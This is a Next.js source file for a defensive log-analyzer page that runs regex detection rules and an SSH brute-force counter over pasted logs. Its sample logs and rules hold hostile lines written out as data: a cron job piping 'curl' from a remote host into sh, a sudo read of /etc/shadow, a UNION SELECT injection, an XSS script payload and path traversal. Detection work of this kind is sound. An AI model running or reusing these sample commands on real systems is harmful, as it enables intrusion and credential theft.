"use client";

import { useMemo, useState } from "react";
import { ScrollText, Play, AlertTriangle, CheckCircle, FileWarning, Clock } from "lucide-react";
import { cn } from "@/lib/utils";
import { PageHeader, Panel, SevBadge, type Severity } from "@/components/ui/kit";

/* ------------------------------------------------------------------ */
/*  Detection rule engine                                              */
/* ------------------------------------------------------------------ */

type Rule = {
  id: string;
  name: string;
  severity: Severity;
  pattern: string;
  description: string;
};

const RULES: Rule[] = [
  { id: "WEB-001", name: "SQL Injection", severity: "critical", pattern: "(union\\s+select|or\\s+1\\s*=\\s*1|drop\\s+table|information_schema|sleep\\s*\\()", description: "Attempts to manipulate SQL queries." },
  { id: "WEB-002", name: "Cross-Site Scripting", severity: "high", pattern: "(<script|javascript:|onerror\\s*=|onload\\s*=|alert\\s*\\()", description: "Injected script or event-handler payloads." },
  { id: "WEB-003", name: "Path Traversal", severity: "high", pattern: "(\\.\\./|\\.\\.\\\\|%2e%2e)", description: "Directory traversal to read sensitive files." },
  { id: "WEB-004", name: "Scanner User-Agent", severity: "medium", pattern: "(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|wpscan)", description: "Known offensive tooling signatures." },
  { id: "SYS-001", name: "New User Created", severity: "medium", pattern: "(useradd|adduser|new user)", description: "Account creation — possible persistence." },
  { id: "SYS-002", name: "Pipe to Shell", severity: "critical", pattern: "(curl|wget)[^|]*\\|\\s*(ba)?sh", description: "Remote script piped directly into a shell." },
  { id: "SYS-003", name: "Privileged sudo Command", severity: "high", pattern: "sudo:.*COMMAND=.*( /bin/(ba)?sh|chmod \\+s|/etc/shadow|passwd)", description: "Suspicious privileged execution." },
];

type Finding = { rule: Rule; line: string; lineNo: number; count?: number; summary?: string };

function scanLogs(log: string): { findings: Finding[]; lines: number } {
  const lines = log.split("\n").filter((l) => l.trim().length > 0);
  const findings: Finding[] = [];

  // Brute-force: group failed SSH logins by source IP
  const brute = new Map<string, number>();
  lines.forEach((line) => {
    const m = line.match(/Failed password for (?:invalid user )?[\w.-]+ from ([\d.]+)/);
    if (m) brute.set(m[1], (brute.get(m[1]) ?? 0) + 1);
  });
  brute.forEach((count, ip) => {
    if (count >= 5) {
      findings.push({
        rule: { id: "AUTH-001", name: "SSH Brute Force", severity: "high", pattern: "", description: "Repeated authentication failures from one source." },
        line: "",
        lineNo: 0,
        count,
        summary: `${count} failed logins from ${ip}`,
      });
    }
  });

  // Pattern rules
  RULES.forEach((rule) => {
    let re: RegExp;
    try {
      re = new RegExp(rule.pattern, "i");
    } catch {
      return;
    }
    lines.forEach((line, idx) => {
      if (re.test(line)) findings.push({ rule, line, lineNo: idx + 1 });
    });
  });

  return { findings, lines: lines.length };
}

function Highlight({ line, pattern }: { line: string; pattern: string }) {
  if (!pattern) return <>{line}</>;
  try {
    const re = new RegExp(pattern, "i");
    const m = line.match(re);
    if (!m || m.index === undefined) return <>{line}</>;
    const start = m.index;
    const end = start + m[0].length;
    return (
      <>
        {line.slice(0, start)}
        <mark>{line.slice(start, end)}</mark>
        {line.slice(end)}
      </>
    );
  } catch {
    return <>{line}</>;
  }
}

/* ------------------------------------------------------------------ */
/*  Samples                                                            */
/* ------------------------------------------------------------------ */

const SAMPLES: Record<string, { label: string; log: string }> = {
  auth: {
    label: "SSH brute force",
    log: `Jul 25 09:14:01 srv sshd[1201]: Failed password for invalid user admin from 203.0.113.45 port 51233 ssh2
Jul 25 09:14:03 srv sshd[1201]: Failed password for invalid user admin from 203.0.113.45 port 51233 ssh2
Jul 25 09:14:05 srv sshd[1201]: Failed password for invalid user root from 203.0.113.45 port 51234 ssh2
Jul 25 09:14:07 srv sshd[1201]: Failed password for invalid user test from 203.0.113.45 port 51235 ssh2
Jul 25 09:14:09 srv sshd[1201]: Failed password for invalid user oracle from 203.0.113.45 port 51236 ssh2
Jul 25 09:14:11 srv sshd[1201]: Failed password for invalid user postgres from 203.0.113.45 port 51237 ssh2
Jul 25 09:15:22 srv sshd[1305]: Accepted password for deploy from 198.51.100.20 port 40122 ssh2
Jul 25 09:20:44 srv sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash`,
  },
  web: {
    label: "Web attacks",
    log: `198.51.100.77 - - [25/Jul/2026:10:02:11] "GET /product?id=1 UNION SELECT username,password FROM users HTTP/1.1" 200
198.51.100.77 - - [25/Jul/2026:10:02:40] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200
198.51.100.77 - - [25/Jul/2026:10:03:05] "GET /../../etc/passwd HTTP/1.1" 403
198.51.100.77 - - [25/Jul/2026:10:03:30] "GET / HTTP/1.1" 200 "sqlmap/1.6"
203.0.113.9 - - [25/Jul/2026:10:05:00] "GET /index.html HTTP/1.1" 200 "Mozilla/5.0"`,
  },
  sys: {
    label: "Persistence",
    log: `Jul 25 11:00:01 srv useradd[2201]: new user: name=svcbackup, UID=1002
Jul 25 11:02:13 srv cron[2210]: (root) CMD (curl http://203.0.113.66/x.sh | sh)
Jul 25 11:05:00 srv sudo: ops : TTY=pts/1 ; USER=root ; COMMAND=/bin/sh -c 'cat /etc/shadow'
Jul 25 11:06:00 srv systemd[1]: Started Daily apt upgrade.`,
  },
};

/* ------------------------------------------------------------------ */
/*  Page                                                               */
/* ------------------------------------------------------------------ */

export default function LogAnalyzer() {
  const [log, setLog] = useState("");
  const [result, setResult] = useState<{ findings: Finding[]; lines: number } | null>(null);
  const [running, setRunning] = useState(false);

  const run = () => {
    if (!log.trim()) return;
    setRunning(true);
    setResult(null);
    setTimeout(() => {
      setResult(scanLogs(log));
      setRunning(false);
    }, 600);
  };

  const sevCounts = useMemo(() => {
    const c: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    result?.findings.forEach((f) => (c[f.rule.severity] += 1));
    return c;
  }, [result]);

  return (
    <div className="animate-rise space-y-6">
      <PageHeader
        icon={ScrollText}
        title="Log Analyzer"
        desc="Paste raw auth, web or system logs and run a Sigma-style rule engine over them. Detections include brute force, SQLi, XSS, path traversal, scanner tooling and persistence."
        badge={`${RULES.length + 1} rules`}
      />

      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        <Panel
          title="Log Input"
          tag={
            <div className="flex gap-1.5">
              {Object.entries(SAMPLES).map(([k, s]) => (
                <button
                  key={k}
                  onClick={() => {
                    setLog(s.log);
                    setResult(null);
                  }}
                  className="rounded border border-white/10 bg-white/5 px-2 py-0.5 text-[10px] text-muted-foreground transition-colors hover:bg-white/10 hover:text-foreground"
                >
                  {s.label}
                </button>
              ))}
            </div>
          }
        >
          <textarea
            value={log}
            onChange={(e) => {
              setLog(e.target.value);
              setResult(null);
            }}
            rows={16}
            placeholder="Paste syslog, auth.log or web access-log lines here…"
            className="w-full resize-none rounded-lg border border-white/10 bg-background/50 px-3 py-2.5 font-mono text-[12px] leading-relaxed transition-all focus:border-primary/50 focus:outline-none focus:ring-2 focus:ring-primary/40"
          />
          <button
            onClick={run}
            disabled={!log.trim() || running}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-colors hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {running ? <Clock className="h-4 w-4 animate-spin" /> : <Play className="h-4 w-4" />}
            {running ? "Scanning…" : "Run Detection Rules"}
          </button>
        </Panel>

        <div className="space-y-4">
          {result ? (
            <>
              <div className="grid grid-cols-3 gap-3">
                <div className="rounded-xl border border-white/10 bg-card/60 p-4 text-center backdrop-blur-lg">
                  <div className="font-mono text-2xl font-semibold tabular-nums">{result.lines}</div>
                  <div className="text-[11px] uppercase tracking-wider text-muted-foreground">Lines</div>
                </div>
                <div className="rounded-xl border border-white/10 bg-card/60 p-4 text-center backdrop-blur-lg">
                  <div className="font-mono text-2xl font-semibold tabular-nums text-orange-400">{result.findings.length}</div>
                  <div className="text-[11px] uppercase tracking-wider text-muted-foreground">Findings</div>
                </div>
                <div className="rounded-xl border border-white/10 bg-card/60 p-4 text-center backdrop-blur-lg">
                  <div className="font-mono text-2xl font-semibold tabular-nums text-red-400">{sevCounts.critical}</div>
                  <div className="text-[11px] uppercase tracking-wider text-muted-foreground">Critical</div>
                </div>
              </div>

              <Panel title={`Detections (${result.findings.length})`}>
                {result.findings.length === 0 ? (
                  <p className="flex items-center gap-2 text-sm text-emerald-400">
                    <CheckCircle className="h-4 w-4" /> No threats detected in the supplied logs.
                  </p>
                ) : (
                  <ul className="max-h-[520px] space-y-3 overflow-y-auto pr-1">
                    {result.findings.map((f, i) => (
                      <li key={i} className="rounded-lg border border-white/5 bg-background/40 p-3">
                        <div className="flex items-center justify-between gap-2">
                          <span className="flex items-center gap-2 text-sm font-medium">
                            <FileWarning className="h-4 w-4 text-muted-foreground" />
                            {f.rule.name}
                            <span className="font-mono text-[10px] text-muted-foreground">{f.rule.id}</span>
                          </span>
                          <SevBadge level={f.rule.severity} />
                        </div>
                        <p className="mt-1 text-xs text-muted-foreground">{f.rule.description}</p>
                        {f.summary ? (
                          <div className="mt-2 flex items-center gap-2 rounded bg-white/5 px-2 py-1.5 font-mono text-[12px] text-orange-300">
                            <AlertTriangle className="h-3.5 w-3.5" /> {f.summary}
                          </div>
                        ) : (
                          <pre className="mt-2 overflow-x-auto whitespace-pre-wrap break-all rounded bg-white/5 px-2 py-1.5 font-mono text-[11px] leading-relaxed text-muted-foreground">
                            <span className="mr-2 text-muted-foreground/50">L{f.lineNo}</span>
                            <Highlight line={f.line} pattern={f.rule.pattern} />
                          </pre>
                        )}
                      </li>
                    ))}
                  </ul>
                )}
              </Panel>
            </>
          ) : (
            <Panel className="min-h-[280px]" bodyClassName="flex h-full min-h-[240px] flex-col items-center justify-center text-center">
              <ScrollText className="mb-4 h-12 w-12 text-muted-foreground/30" />
              <h3 className="font-grotesk font-semibold text-muted-foreground">No Scan Yet</h3>
              <p className="mt-2 max-w-xs text-sm text-muted-foreground/70">
                Paste logs (or load a sample) and run the detection rules to see findings here.
              </p>
            </Panel>
          )}
        </div>
      </div>
    </div>
  );
}
